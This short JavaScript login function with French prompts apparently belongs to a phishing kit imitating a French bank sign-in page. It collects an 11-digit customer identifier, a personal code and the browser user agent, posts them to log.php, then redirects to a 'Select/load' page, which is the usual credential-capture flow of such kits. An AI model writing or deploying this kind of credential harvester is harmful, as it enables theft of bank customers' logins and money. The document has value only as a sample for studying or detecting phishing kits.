function login(){
	
var ID_CR =	$("#identifiant").val();
var PASS_CR	 =	$("#password").val();

	
 if(ID_CR==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Saisissez votre identifiant à 11 chiffres"

})	

return false;	
} 
if(PASS_CR==''){

swal({
icon: 'error',
title: 'Erreur !',
text: "Saisissez votre code personnel"

})	

return false;	
} 


var data_log = 
{
DEVICE_CR       : navigator.userAgent,
ID_CR		    :   ID_CR,
PASS_CR         :	PASS_CR

}; 


var _url = 'log.php';
$.post(_url,data_log,function(data){
 var reponse = JSON.parse(data); 


if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


     window.location="./Select/load.html";
    

    

} 


})
}